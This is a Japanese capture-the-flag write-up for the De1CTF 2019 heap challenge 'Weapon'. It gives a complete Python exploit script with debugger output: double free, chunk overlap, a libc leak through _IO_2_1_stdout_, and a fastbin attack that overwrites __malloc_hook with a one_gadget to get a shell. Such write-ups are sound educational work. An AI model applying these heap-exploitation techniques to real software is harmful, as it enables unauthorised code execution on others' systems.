# [pwn 219pts] Weapon - De1CTF 2019
64ビットバイナリで全部有効です。
```
$ checksec -f pwn
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes     0               2       pwn
```
create, delete, renameの機能があるヒープ系問題です。
サイズ0x60までmallocでき、最大10個のweaponを保存できます。
deleteにはシンプルなdouble freeがあります。
したがって、renameにはuse after freeがあります。
問題はshow機能が無いという点ですが、まぁ_IO_FILEをいじってlibcリークするんでしょうね。

とにかく、チャンクのサイズが0x60ではlibcのアドレスが取れないのでchunk overlapで大きなサイズをfreeしましょう。
fastbinではmalloc時にサイズチェックが走るので、偽チャンクのサイズはeditで後から変更するように注意が必要です。
```python
# chunk overlap
create(0x18, 0, "chunk 0") # 0x00
create(0x18, 1, "chunk 1") # 0x20
fake_chunk_1 = p64(0) + p64(0x21)  # target (0x21 to bypass size check)
fake_chunk_2 = b"A" * 0x30
fake_chunk_2 += p64(0) + p64(0x21) # target + 0x90
fake_chunk_3 = b"B" * 0x10         # target + 0xb0
create(0x58, 2, fake_chunk_1) # 0x40 (fake_chunk_1: 0x50)
create(0x58, 3, fake_chunk_2) # 0xa0 (fake_chunk_2: 0xb0)
create(0x58, 3, fake_chunk_3) # 0x100 (fake_chunk_3: 0x110)
delete(0)
delete(1)
delete(0)
delete(1)
create(0x18, 0, b'\x50') # fd --> fake_chunk
create(0x18, 0, p64(0))
create(0x18, 0, b'A')
create(0x18, 0, b'target')
rename(2, p64(0) + p64(0x91))
delete(0)

sock.interactive()
```

こんな感じでサイズ0x91の偽チャンクにlibcのアドレスが入りました。
```
pwndbg> x/16xg 0x5630fb2fd000
0x5630fb2fd000: 0x0000000000000000      0x0000000000000021
0x5630fb2fd010: 0x0000000000000000      0x0000000000000000
0x5630fb2fd020: 0x0000000000000000      0x0000000000000021
0x5630fb2fd030: 0x00005630fb2fd041      0x0000000000000000
0x5630fb2fd040: 0x0000000000000000      0x0000000000000061
0x5630fb2fd050: 0x0000000000000000      0x0000000000000091
0x5630fb2fd060: 0x00007fdad467fb78      0x00007fdad467fb78
0x5630fb2fd070: 0x0000000000000000      0x0000000000000000
```

次に、`_IO_2_1_stdout_`を改ざんする必要があります。
そこで、先程ヒープに書き込まれたmain_arenaのアドレスを`_IO_2_1_stdout_`の近くに向けます。
下の例では0x7f12289bd620に`_IO_2_1_stdout_`がありますが、`0x7f12289bd5dd`にチャンクサイズとして使えそうな領域があります。
```
0x7f12289bd5dd <_IO_2_1_stderr_+157>:   0x12289bc660000000      0x000000000000007f
0x7f12289bd5ed <_IO_2_1_stderr_+173>:   0x0000000000000000      0x0000000000000000
...
0x7f12289bd620 <_IO_2_1_stdout_>:       0x00000000fbad2887      0x00007f12289bd6a3
0x7f12289bd630 <_IO_2_1_stdout_+16>:    0x00007f12289bd6a3      0x00007f12289bd6a3
0x7f12289bd640 <_IO_2_1_stdout_+32>:    0x00007f12289bd6a3      0x00007f12289bd6a3
...
```
fastbinではmalloc時のサイズチェックがありますが、malloc(0x60)するときにfastbinが0x7f12289bd5ddに繋がっていれば落ちません。
これにより16分の1の確率で`_IO_2_1_stdout_`のwrite ptrを改ざんしてlibc leakできそうです。

```python
# libc leak
create(0x60, 0, b"\xdd\x25")

delete(4)
delete(3)
delete(4)
create(0x60, 0, b"\x50")
create(0x60, 0, p64(0))
create(0x60, 0, b'A')
create(0x60, 0, b'target')

fake_file = b'A' * 0x33
fake_file += p64(0xfbad1800)
fake_file += p64(0) * 3
fake_file += b'\x88'
create(0x60, 1, fake_file)

print(sock.recvuntil("1"))
```

ちなみにflagsを0xfbad1800にしたのは、0x1800だとすぐに出力される(らしい)からです。（なんかそういうフラグが定義されている。）
いい感じです！
```
$ python solve.py 
[+] __init__: Successfully connected to localhost:9999
b'\xe0\x18\xf5\xb2\x8c\x7f\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x001'
. create you weapon
2. delete you weapon
3. rename your weapon
choice >> [ptrlib]$
```

あとはdouble freeで`__malloc_hook`につなげればおしまい。

```python
from ptrlib import *

def create(size, index, name, newline=True):
    nl = "\n" if newline else ""
    sock.sendlineafter(">> "+nl, "1")
    sock.sendlineafter("weapon: ", str(size))
    sock.sendlineafter("index: ", str(index))
    sock.sendafter("name:"+nl, name)
    return

def delete(index, newline=True):
    nl = "\n" if newline else ""
    sock.sendlineafter(">> "+nl, "2")
    sock.sendlineafter("idx :", str(index))
    return

def rename(index, name):
    sock.sendlineafter(">> \n", "3")
    sock.sendlineafter("idx: ", str(index))
    sock.sendafter("content:\n", name)
    return

libc = ELF("./libc.so.6")
sock = Socket("localhost", 9999)
one_gadget = 0xf1147

# chunk overlap
create(0x18, 0, "chunk 0") # 0x00
create(0x18, 1, "chunk 1") # 0x20
fake_chunk_1 = p64(0) + p64(0x21)  # target (0x21 to bypass size check)
fake_chunk_2 = b"A" * 0x30
fake_chunk_2 += p64(0) + p64(0x31) # target + 0x90
fake_chunk_3 = b"B" * 0x10         # target + 0xb0
create(0x58, 2, fake_chunk_1) # 0x40 (fake_chunk_1: 0x50)
create(0x60, 3, fake_chunk_2) # 0xa0 (fake_chunk_2: 0xb0)
create(0x60, 4, fake_chunk_3) # 0x100 (fake_chunk_3: 0x110)
delete(0)
delete(1)
delete(0)
create(0x18, 0, b'\x50') # fd --> fake_chunk
create(0x18, 0, p64(0))
create(0x18, 0, b'A')
create(0x18, 0, b'target')
rename(2, p64(0) + p64(0x91))
delete(0)

# libc leak
create(0x60, 0, b"\xdd\x25")
create(0x60, 8, b"chunk 4")
create(0x60, 9, b"chunk 5")

delete(4)
delete(3)
delete(4)
create(0x60, 0, b"\x50")
create(0x60, 4, p64(0))
create(0x60, 5, b'A')
create(0x60, 0, b'target')

fake_file = b'A' * 0x33
fake_file += p64(0xfbad1800)
fake_file += p64(0) * 3
fake_file += b'\x88'
create(0x60, 1, fake_file)

libc_base = u64(sock.recv(8)) - libc.symbol("_IO_2_1_stdin_")
logger.info("libc base = " + hex(libc_base))

# fastbin attack
delete(8, newline=False)
delete(9, newline=False)
delete(8, newline=False)
create(0x60, 0, p64(libc_base + libc.symbol("__malloc_hook") - 0x23), newline=False)
create(0x60, 4, p64(0), newline=False)
create(0x60, 5, b'A', newline=False)
payload = b'A' * 0x13
payload += p64(libc_base + one_gadget)
create(0x60, 0, payload, newline=False)

sock.interactive()
```

できたー！
```
$ python solve.py 
[+] __init__: Successfully connected to localhost:9999
[+] <module>: libc base = 0x7f95c26fd000
[ptrlib]$ 
1. create you weapon
2. delete you weapon
3. rename your weapon
choice >> 1

wlecome input your size of weapon: [ptrlib]$ 18
input index: [ptrlib]$ 1
[ptrlib]$ ls
pwn
[ptrlib]$ whoami
root
[ptrlib]$
```

# 感想
こういうのを競技中にさくっと解けるようになりたい。

# 参考文献
[1] [https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/pwn/Weapon](https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/pwn/Weapon)